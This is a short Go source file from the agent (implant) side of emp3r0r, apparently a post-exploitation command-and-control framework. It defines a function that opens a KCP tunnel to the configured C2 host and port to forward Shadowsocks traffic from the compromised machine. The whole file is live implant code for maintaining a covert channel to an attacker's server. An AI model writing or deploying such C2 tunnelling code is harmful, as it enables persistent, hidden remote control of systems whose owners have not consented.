package agent

import (
	"log"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

// Connect to C2 KCP server, forward Shadowsocks traffic
func KCPClient() {
	if !RuntimeConfig.UseKCP {
		return
	}
	err := tun.KCPTunClient(RuntimeConfig.CCHost, RuntimeConfig.KCPPort,
		RuntimeConfig.Password, emp3r0r_data.MagicString)
	if err != nil {
		log.Printf("KCPTUN failed to start: %v", err)
	}
}
